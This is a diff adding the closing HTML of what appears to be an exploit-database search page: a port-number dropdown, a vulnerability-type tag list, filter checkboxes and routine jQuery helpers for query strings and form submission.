+                                    <option value="3306" >
+                                        3306
+                                    </option>
+
+
+                                
+                                    <option value="3333" >
+                                        3333
+                                    </option>
+
+
+                                
+                                    <option value="3378" >
+                                        3378
+                                    </option>
+
+
+                                
+                                    <option value="3389" >
+                                        3389
+                                    </option>
+
+
+                                
+                                    <option value="3460" >
+                                        3460
+                                    </option>
+
+
+                                
+                                    <option value="3465" >
+                                        3465
+                                    </option>
+
+
+                                
+                                    <option value="3500" >
+                                        3500
+                                    </option>
+
+
+                                
+                                    <option value="3535" >
+                                        3535
+                                    </option>
+
+
+                                
+                                    <option value="3632" >
+                                        3632
+                                    </option>
+
+
+                                
+                                    <option value="3690" >
+                                        3690
+                                    </option>
+
+
+                                
+                                    <option value="3790" >
+                                        3790
+                                    </option>
+
+
+                                
+                                    <option value="3814" >
+                                        3814
+                                    </option>
+
+
+                                
+                                    <option value="3817" >
+                                        3817
+                                    </option>
+
+
+                                
+                                    <option value="4000" >
+                                        4000
+                                    </option>
+
+
+                                
+                                    <option value="4002" >
+                                        4002
+                                    </option>
+
+
+                                
+                                    <option value="4070" >
+                                        4070
+                                    </option>
+
+
+                                
+                                    <option value="4081" >
+                                        4081
+                                    </option>
+
+
+                                
+                                    <option value="4105" >
+                                        4105
+                                    </option>
+
+
+                                
+                                    <option value="4111" >
+                                        4111
+                                    </option>
+
+
+                                
+                                    <option value="4322" >
+                                        4322
+                                    </option>
+
+
+                                
+                                    <option value="4343" >
+                                        4343
+                                    </option>
+
+
+                                
+                                    <option value="4434" >
+                                        4434
+                                    </option>
+
+
+                                
+                                    <option value="4501" >
+                                        4501
+                                    </option>
+
+
+                                
+                                    <option value="4555" >
+                                        4555
+                                    </option>
+
+
+                                
+                                    <option value="4592" >
+                                        4592
+                                    </option>
+
+
+                                
+                                    <option value="4661" >
+                                        4661
+                                    </option>
+
+
+                                
+                                    <option value="4750" >
+                                        4750
+                                    </option>
+
+
+                                
+                                    <option value="4848" >
+                                        4848
+                                    </option>
+
+
+                                
+                                    <option value="5000" >
+                                        5000
+                                    </option>
+
+
+                                
+                                    <option value="5060" >
+                                        5060
+                                    </option>
+
+
+                                
+                                    <option value="5061" >
+                                        5061
+                                    </option>
+
+
+                                
+                                    <option value="5080" >
+                                        5080
+                                    </option>
+
+
+                                
+                                    <option value="5081" >
+                                        5081
+                                    </option>
+
+
+                                
+                                    <option value="5093" >
+                                        5093
+                                    </option>
+
+
+                                
+                                    <option value="5151" >
+                                        5151
+                                    </option>
+
+
+                                
+                                    <option value="5180" >
+                                        5180
+                                    </option>
+
+
+                                
+                                    <option value="5247" >
+                                        5247
+                                    </option>
+
+
+                                
+                                    <option value="5250" >
+                                        5250
+                                    </option>
+
+
+                                
+                                    <option value="5272" >
+                                        5272
+                                    </option>
+
+
+                                
+                                    <option value="5308" >
+                                        5308
+                                    </option>
+
+
+                                
+                                    <option value="5432" >
+                                        5432
+                                    </option>
+
+
+                                
+                                    <option value="5466" >
+                                        5466
+                                    </option>
+
+
+                                
+                                    <option value="5554" >
+                                        5554
+                                    </option>
+
+
+                                
+                                    <option value="5555" >
+                                        5555
+                                    </option>
+
+
+                                
+                                    <option value="5600" >
+                                        5600
+                                    </option>
+
+
+                                
+                                    <option value="5655" >
+                                        5655
+                                    </option>
+
+
+                                
+                                    <option value="5666" >
+                                        5666
+                                    </option>
+
+
+                                
+                                    <option value="5800" >
+                                        5800
+                                    </option>
+
+
+                                
+                                    <option value="5803" >
+                                        5803
+                                    </option>
+
+
+                                
+                                    <option value="5814" >
+                                        5814
+                                    </option>
+
+
+                                
+                                    <option value="5858" >
+                                        5858
+                                    </option>
+
+
+                                
+                                    <option value="5900" >
+                                        5900
+                                    </option>
+
+
+                                
+                                    <option value="5984" >
+                                        5984
+                                    </option>
+
+
+                                
+                                    <option value="6066" >
+                                        6066
+                                    </option>
+
+
+                                
+                                    <option value="6070" >
+                                        6070
+                                    </option>
+
+
+                                
+                                    <option value="6080" >
+                                        6080
+                                    </option>
+
+
+                                
+                                    <option value="6082" >
+                                        6082
+                                    </option>
+
+
+                                
+                                    <option value="6101" >
+                                        6101
+                                    </option>
+
+
+                                
+                                    <option value="6112" >
+                                        6112
+                                    </option>
+
+
+                                
+                                    <option value="6129" >
+                                        6129
+                                    </option>
+
+
+                                
+                                    <option value="6379" >
+                                        6379
+                                    </option>
+
+
+                                
+                                    <option value="6502" >
+                                        6502
+                                    </option>
+
+
+                                
+                                    <option value="6503" >
+                                        6503
+                                    </option>
+
+
+                                
+                                    <option value="6660" >
+                                        6660
+                                    </option>
+
+
+                                
+                                    <option value="6667" >
+                                        6667
+                                    </option>
+
+
+                                
+                                    <option value="7001" >
+                                        7001
+                                    </option>
+
+
+                                
+                                    <option value="7002" >
+                                        7002
+                                    </option>
+
+
+                                
+                                    <option value="7070" >
+                                        7070
+                                    </option>
+
+
+                                
+                                    <option value="7071" >
+                                        7071
+                                    </option>
+
+
+                                
+                                    <option value="7080" >
+                                        7080
+                                    </option>
+
+
+                                
+                                    <option value="7100" >
+                                        7100
+                                    </option>
+
+
+                                
+                                    <option value="7144" >
+                                        7144
+                                    </option>
+
+
+                                
+                                    <option value="7210" >
+                                        7210
+                                    </option>
+
+
+                                
+                                    <option value="7272" >
+                                        7272
+                                    </option>
+
+
+                                
+                                    <option value="7290" >
+                                        7290
+                                    </option>
+
+
+                                
+                                    <option value="7426" >
+                                        7426
+                                    </option>
+
+
+                                
+                                    <option value="7443" >
+                                        7443
+                                    </option>
+
+
+                                
+                                    <option value="7510" >
+                                        7510
+                                    </option>
+
+
+                                
+                                    <option value="7547" >
+                                        7547
+                                    </option>
+
+
+                                
+                                    <option value="7649" >
+                                        7649
+                                    </option>
+
+
+                                
+                                    <option value="7770" >
+                                        7770
+                                    </option>
+
+
+                                
+                                    <option value="7777" >
+                                        7777
+                                    </option>
+
+
+                                
+                                    <option value="7778" >
+                                        7778
+                                    </option>
+
+
+                                
+                                    <option value="7787" >
+                                        7787
+                                    </option>
+
+
+                                
+                                    <option value="7879" >
+                                        7879
+                                    </option>
+
+
+                                
+                                    <option value="7902" >
+                                        7902
+                                    </option>
+
+
+                                
+                                    <option value="8000" >
+                                        8000
+                                    </option>
+
+
+                                
+                                    <option value="8001" >
+                                        8001
+                                    </option>
+
+
+                                
+                                    <option value="8002" >
+                                        8002
+                                    </option>
+
+
+                                
+                                    <option value="8004" >
+                                        8004
+                                    </option>
+
+
+                                
+                                    <option value="8008" >
+                                        8008
+                                    </option>
+
+
+                                
+                                    <option value="8020" >
+                                        8020
+                                    </option>
+
+
+                                
+                                    <option value="8022" >
+                                        8022
+                                    </option>
+
+
+                                
+                                    <option value="8023" >
+                                        8023
+                                    </option>
+
+
+                                
+                                    <option value="8028" >
+                                        8028
+                                    </option>
+
+
+                                
+                                    <option value="8030" >
+                                        8030
+                                    </option>
+
+
+                                
+                                    <option value="8080" >
+                                        8080
+                                    </option>
+
+
+                                
+                                    <option value="8081" >
+                                        8081
+                                    </option>
+
+
+                                
+                                    <option value="8082" >
+                                        8082
+                                    </option>
+
+
+                                
+                                    <option value="8088" >
+                                        8088
+                                    </option>
+
+
+                                
+                                    <option value="8090" >
+                                        8090
+                                    </option>
+
+
+                                
+                                    <option value="8181" >
+                                        8181
+                                    </option>
+
+
+                                
+                                    <option value="8300" >
+                                        8300
+                                    </option>
+
+
+                                
+                                    <option value="8400" >
+                                        8400
+                                    </option>
+
+
+                                
+                                    <option value="8443" >
+                                        8443
+                                    </option>
+
+
+                                
+                                    <option value="8445" >
+                                        8445
+                                    </option>
+
+
+                                
+                                    <option value="8473" >
+                                        8473
+                                    </option>
+
+
+                                
+                                    <option value="8500" >
+                                        8500
+                                    </option>
+
+
+                                
+                                    <option value="8585" >
+                                        8585
+                                    </option>
+
+
+                                
+                                    <option value="8619" >
+                                        8619
+                                    </option>
+
+
+                                
+                                    <option value="8800" >
+                                        8800
+                                    </option>
+
+
+                                
+                                    <option value="8812" >
+                                        8812
+                                    </option>
+
+
+                                
+                                    <option value="8839" >
+                                        8839
+                                    </option>
+
+
+                                
+                                    <option value="8880" >
+                                        8880
+                                    </option>
+
+
+                                
+                                    <option value="8888" >
+                                        8888
+                                    </option>
+
+
+                                
+                                    <option value="9000" >
+                                        9000
+                                    </option>
+
+
+                                
+                                    <option value="9001" >
+                                        9001
+                                    </option>
+
+
+                                
+                                    <option value="9002" >
+                                        9002
+                                    </option>
+
+
+                                
+                                    <option value="9080" >
+                                        9080
+                                    </option>
+
+
+                                
+                                    <option value="9090" >
+                                        9090
+                                    </option>
+
+
+                                
+                                    <option value="9091" >
+                                        9091
+                                    </option>
+
+
+                                
+                                    <option value="9100" >
+                                        9100
+                                    </option>
+
+
+                                
+                                    <option value="9124" >
+                                        9124
+                                    </option>
+
+
+                                
+                                    <option value="9200" >
+                                        9200
+                                    </option>
+
+
+                                
+                                    <option value="9251" >
+                                        9251
+                                    </option>
+
+
+                                
+                                    <option value="9256" >
+                                        9256
+                                    </option>
+
+
+                                
+                                    <option value="9443" >
+                                        9443
+                                    </option>
+
+
+                                
+                                    <option value="9447" >
+                                        9447
+                                    </option>
+
+
+                                
+                                    <option value="9784" >
+                                        9784
+                                    </option>
+
+
+                                
+                                    <option value="9788" >
+                                        9788
+                                    </option>
+
+
+                                
+                                    <option value="9855" >
+                                        9855
+                                    </option>
+
+
+                                
+                                    <option value="9876" >
+                                        9876
+                                    </option>
+
+
+                                
+                                    <option value="9900" >
+                                        9900
+                                    </option>
+
+
+                                
+                                    <option value="9987" >
+                                        9987
+                                    </option>
+
+
+                                
+                                    <option value="9993" >
+                                        9993
+                                    </option>
+
+
+                                
+                                    <option value="9999" >
+                                        9999
+                                    </option>
+
+
+                                
+                                    <option value="10000" >
+                                        10000
+                                    </option>
+
+
+                                
+                                    <option value="10001" >
+                                        10001
+                                    </option>
+
+
+                                
+                                    <option value="10080" >
+                                        10080
+                                    </option>
+
+
+                                
+                                    <option value="10202" >
+                                        10202
+                                    </option>
+
+
+                                
+                                    <option value="10203" >
+                                        10203
+                                    </option>
+
+
+                                
+                                    <option value="10443" >
+                                        10443
+                                    </option>
+
+
+                                
+                                    <option value="10616" >
+                                        10616
+                                    </option>
+
+
+                                
+                                    <option value="11000" >
+                                        11000
+                                    </option>
+
+
+                                
+                                    <option value="11211" >
+                                        11211
+                                    </option>
+
+
+                                
+                                    <option value="11460" >
+                                        11460
+                                    </option>
+
+
+                                
+                                    <option value="12203" >
+                                        12203
+                                    </option>
+
+
+                                
+                                    <option value="12221" >
+                                        12221
+                                    </option>
+
+
+                                
+                                    <option value="12345" >
+                                        12345
+                                    </option>
+
+
+                                
+                                    <option value="12397" >
+                                        12397
+                                    </option>
+
+
+                                
+                                    <option value="12401" >
+                                        12401
+                                    </option>
+
+
+                                
+                                    <option value="13327" >
+                                        13327
+                                    </option>
+
+
+                                
+                                    <option value="13701" >
+                                        13701
+                                    </option>
+
+
+                                
+                                    <option value="13722" >
+                                        13722
+                                    </option>
+
+
+                                
+                                    <option value="13838" >
+                                        13838
+                                    </option>
+
+
+                                
+                                    <option value="16992" >
+                                        16992
+                                    </option>
+
+
+                                
+                                    <option value="18821" >
+                                        18821
+                                    </option>
+
+
+                                
+                                    <option value="18881" >
+                                        18881
+                                    </option>
+
+
+                                
+                                    <option value="19000" >
+                                        19000
+                                    </option>
+
+
+                                
+                                    <option value="19810" >
+                                        19810
+                                    </option>
+
+
+                                
+                                    <option value="19813" >
+                                        19813
+                                    </option>
+
+
+                                
+                                    <option value="20000" >
+                                        20000
+                                    </option>
+
+
+                                
+                                    <option value="20002" >
+                                        20002
+                                    </option>
+
+
+                                
+                                    <option value="20010" >
+                                        20010
+                                    </option>
+
+
+                                
+                                    <option value="20031" >
+                                        20031
+                                    </option>
+
+
+                                
+                                    <option value="20111" >
+                                        20111
+                                    </option>
+
+
+                                
+                                    <option value="20171" >
+                                        20171
+                                    </option>
+
+
+                                
+                                    <option value="22003" >
+                                        22003
+                                    </option>
+
+
+                                
+                                    <option value="23423" >
+                                        23423
+                                    </option>
+
+
+                                
+                                    <option value="25672" >
+                                        25672
+                                    </option>
+
+
+                                
+                                    <option value="26000" >
+                                        26000
+                                    </option>
+
+
+                                
+                                    <option value="27015" >
+                                        27015
+                                    </option>
+
+
+                                
+                                    <option value="27700" >
+                                        27700
+                                    </option>
+
+
+                                
+                                    <option value="28015" >
+                                        28015
+                                    </option>
+
+
+                                
+                                    <option value="30000" >
+                                        30000
+                                    </option>
+
+
+                                
+                                    <option value="30303" >
+                                        30303
+                                    </option>
+
+
+                                
+                                    <option value="31337" >
+                                        31337
+                                    </option>
+
+
+                                
+                                    <option value="32400" >
+                                        32400
+                                    </option>
+
+
+                                
+                                    <option value="32674" >
+                                        32674
+                                    </option>
+
+
+                                
+                                    <option value="32764" >
+                                        32764
+                                    </option>
+
+
+                                
+                                    <option value="34205" >
+                                        34205
+                                    </option>
+
+
+                                
+                                    <option value="37215" >
+                                        37215
+                                    </option>
+
+
+                                
+                                    <option value="37777" >
+                                        37777
+                                    </option>
+
+
+                                
+                                    <option value="37848" >
+                                        37848
+                                    </option>
+
+
+                                
+                                    <option value="38292" >
+                                        38292
+                                    </option>
+
+
+                                
+                                    <option value="40007" >
+                                        40007
+                                    </option>
+
+
+                                
+                                    <option value="41523" >
+                                        41523
+                                    </option>
+
+
+                                
+                                    <option value="44334" >
+                                        44334
+                                    </option>
+
+
+                                
+                                    <option value="46824" >
+                                        46824
+                                    </option>
+
+
+                                
+                                    <option value="48080" >
+                                        48080
+                                    </option>
+
+
+                                
+                                    <option value="49152" >
+                                        49152
+                                    </option>
+
+
+                                
+                                    <option value="50000" >
+                                        50000
+                                    </option>
+
+
+                                
+                                    <option value="50496" >
+                                        50496
+                                    </option>
+
+
+                                
+                                    <option value="52311" >
+                                        52311
+                                    </option>
+
+
+                                
+                                    <option value="52789" >
+                                        52789
+                                    </option>
+
+
+                                
+                                    <option value="52869" >
+                                        52869
+                                    </option>
+
+
+                                
+                                    <option value="52986" >
+                                        52986
+                                    </option>
+
+
+                                
+                                    <option value="53413" >
+                                        53413
+                                    </option>
+
+
+                                
+                                    <option value="54345" >
+                                        54345
+                                    </option>
+
+
+                                
+                                    <option value="54890" >
+                                        54890
+                                    </option>
+
+
+                                
+                                    <option value="55554" >
+                                        55554
+                                    </option>
+
+
+                                
+                                    <option value="55555" >
+                                        55555
+                                    </option>
+
+
+                                
+                                    <option value="56380" >
+                                        56380
+                                    </option>
+
+
+                                
+                                    <option value="57772" >
+                                        57772
+                                    </option>
+
+
+                                
+                                    <option value="58080" >
+                                        58080
+                                    </option>
+
+
+                                
+                                    <option value="62514" >
+                                        62514
+                                    </option>
+
+
+                                
+                            </select>
+
+                        </div>
+
+                        <div class="col-sm-6 col-lg-4">
+
+                            <label for="tagSearchSelect" class="text-primary">Tag</label>
+
+                            <select id="tagSearchSelect" name="tag" class="form-control">
+
+                                <option></option>
+                                
+                                    <option value="1" >
+                                        WordPress Core
+                                    </option>
+
+
+                                
+                                    <option value="3" >
+                                        Metasploit Framework (MSF)
+                                    </option>
+
+
+                                
+                                    <option value="4" >
+                                        WordPress Plugin
+                                    </option>
+
+
+                                
+                                    <option value="7" >
+                                        SQL Injection (SQLi)
+                                    </option>
+
+
+                                
+                                    <option value="8" >
+                                        Cross-Site Scripting (XSS)
+                                    </option>
+
+
+                                
+                                    <option value="9" >
+                                        File Inclusion (LFI/RFI)
+                                    </option>
+
+
+                                
+                                    <option value="12" >
+                                        Cross-Site Request Forgery (CSRF)
+                                    </option>
+
+
+                                
+                                    <option value="13" >
+                                        Denial of Service (DoS)
+                                    </option>
+
+
+                                
+                                    <option value="14" >
+                                        Code Injection
+                                    </option>
+
+
+                                
+                                    <option value="15" >
+                                        Command Injection
+                                    </option>
+
+
+                                
+                                    <option value="16" >
+                                        Authentication Bypass / Credentials Bypass (AB/CB)
+                                    </option>
+
+
+                                
+                                    <option value="18" >
+                                        Client Side
+                                    </option>
+
+
+                                
+                                    <option value="19" >
+                                        Use After Free (UAF)
+                                    </option>
+
+
+                                
+                                    <option value="20" >
+                                        Out Of Bounds
+                                    </option>
+
+
+                                
+                                    <option value="21" >
+                                        Remote
+                                    </option>
+
+
+                                
+                                    <option value="22" >
+                                        Local
+                                    </option>
+
+
+                                
+                                    <option value="23" >
+                                        XML External Entity (XXE)
+                                    </option>
+
+
+                                
+                                    <option value="24" >
+                                        Integer Overflow
+                                    </option>
+
+
+                                
+                                    <option value="25" >
+                                        Server-Side Request Forgery (SSRF)
+                                    </option>
+
+
+                                
+                                    <option value="26" >
+                                        Race Condition
+                                    </option>
+
+
+                                
+                                    <option value="27" >
+                                        NULL Pointer Dereference
+                                    </option>
+
+
+                                
+                                    <option value="28" >
+                                        Malware
+                                    </option>
+
+
+                                
+                                    <option value="31" >
+                                        Buffer Overflow
+                                    </option>
+
+
+                                
+                                    <option value="34" >
+                                        Heap Overflow
+                                    </option>
+
+
+                                
+                                    <option value="35" >
+                                        Type Confusion
+                                    </option>
+
+
+                                
+                                    <option value="36" >
+                                        Object Injection
+                                    </option>
+
+
+                                
+                                    <option value="37" >
+                                        Bug Report
+                                    </option>
+
+
+                                
+                                    <option value="38" >
+                                        Console
+                                    </option>
+
+
+                                
+                                    <option value="39" >
+                                        Pwn2Own
+                                    </option>
+
+
+                                
+                                    <option value="40" >
+                                        Traversal
+                                    </option>
+
+
+                                
+                                    <option value="41" >
+                                        Deserialization
+                                    </option>
+
+
+                                
+                            </select>
+
+                        </div>
+
+                    </div>
+
+                    <div class="row">
+
+                        <div class="col-12">
+
+                            <div class="form-check form-check-inline">
+
+                                <label class="form-check-label text-primary">
+
+                                    <input class="form-check-input" type="checkbox"
+                                           name="verified" value="true"
+                                           id="verifiedSearchCheck"   >
+                                    Verified
+
+                                    <span class="form-check-sign">
+                                        <span class="check"></span>
+                                    </span>
+
+                                </label>
+
+                            </div>
+
+                            <div class="form-check form-check-inline">
+
+                                <label class="form-check-label text-primary">
+                                    <input class="form-check-input" type="checkbox"
+                                           name="hasapp" value="true"
+                                           id="hasappSearchCheck" >
+                                    Has App
+
+                                    <span class="form-check-sign">
+                                        <span class="check"></span>
+                                    </span>
+
+                                </label>
+
+                            </div>
+
+                            <div class="form-check form-check-inline">
+
+                                <label class="form-check-label text-primary">
+                                    <input class="form-check-input" type="checkbox"
+                                           name="nomsf" value="true"
+                                           id="nomsfCheck" >
+                                    No Metasploit
+
+                                    <span class="form-check-sign">
+                                        <span class="check"></span>
+                                    </span>
+
+                                </label>
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                    <div class="row">
+
+                        <div class="col-12">
+
+                            <button type="submit" class="btn btn-primary float-right">Search</button>
+
+                        </div>
+
+                    </div>
+
+                </form>
+
+
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+</footer>
+
+    </div>
+
+</div>
+
+</body>
+
+<!--   Make the default DataTables search field larger   -->
+<style type="text/css">
+    .dataTables_filter input {
+        font-size: 16px;
+    }
+</style>
+
+<!--   Core JS Files   -->
+<script src="/js/core/jquery.min.js"></script>
+<script src="/js/core/popper.min.js"></script>
+<script src="/js/core/bootstrap.min.js"></script>
+
+<script src="/js/plugins/perfect-scrollbar.jquery.min.js"></script>
+<script src="/js/plugins/moment.min.js"></script>
+
+<!-- Forms Validations Plugin -->
+<script src="/js/plugins/jquery.validate.min.js"></script>
+
+<!--  DataTables.net Plugin, full documentation here:
+https://datatables.net/    -->
+<script src="/js/plugins/jquery.dataTables.min.js"></script>
+
+<!--  Notifications Plugin    -->
+<script src="/js/plugins/bootstrap-notify.js"></script>
+
+<!-- Control Center for Now Ui Dashboard: parallax effects,
+scripts for the example pages etc -->
+<script src="/js/now-ui-dashboard.js"></script>
+
+<script src="/js/selectize.min.js"></script>
+
+<script src="/js/app.js"></script>
+<script src="/js/appfunctions.js"></script>
+
+
+<script>
+    window.addEventListener('popstate', () => {
+        location.reload();
+    }, false);
+
+    $(function () {
+        $('[data-toggle="tooltip"]').tooltip()
+    })
+
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+
+    function removeURLParameter(url, parameter) {
+        //prefer to use l.search if you have a location/link object
+        var urlparts= url.split('?');
+        if (urlparts.length>=2) {
+
+            var prefix= encodeURIComponent(parameter)+'=';
+            var pars= urlparts[1].split(/[&;]/g);
+
+            //reverse iteration as may be destructive
+            for (var i= pars.length; i-- > 0;) {
+                //idiom for string.startsWith
+                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
+                    pars.splice(i, 1);
+                }
+            }
+
+            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
+            window.history.pushState('', document.title, url);
+            return url;
+        } else {
+            window.history.pushState('', document.title, url);
+            return url;
+        }
+    }
+
+    function showFilters() {
+        var x = document.getElementById("exploitFiltersCard");
+        if (x.style.display === "none") {
+            x.style.display = "block";
+        } else {
+            x.style.display = "none";
+        }
+    }
+
+    function updateQueryString(key, value, url) {
+        if (!url) url = window.location.href;
+        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
+            hash;
+
+        if (re.test(url)) {
+            if (typeof value !== 'undefined' && value !== null)
+                return url.replace(re, '$1' + key + "=" + value + '$2$3');
+            else {
+                hash = url.split('#');
+                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
+                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
+                    url += '#' + hash[1];
+
+                window.history.pushState('', document.title, url);
+                return url;
+            }
+        }
+        else {
+            if (typeof value !== 'undefined' && value !== null) {
+                var separator = url.indexOf('?') !== -1 ? '&' : '?';
+                hash = url.split('#');
+                url = hash[0] + separator + key + '=' + value;
+                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
+                    url += '#' + hash[1];
+
+                window.history.pushState('', document.title, url);
+                return url;
+            }
+            else
+                window.history.pushState('', document.title, url);
+                return url;
+        }
+    }
+
+    $('#search').submit(function() {
+        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
+        return true; // ensure form still submits
+    });
+
+    // Un-disable form fields when page loads, in case they click back after submission
+    $('#search').find( ":input" ).prop( "disabled", false );
+
+    // If the ajax call fails, throw the error to the console instead of
+    // popping up an alert to the user
+    $.fn.dataTable.ext.errMode = 'throw';
+
+</script>
+
+<!-- App scripts -->
+
+
+
+</html>
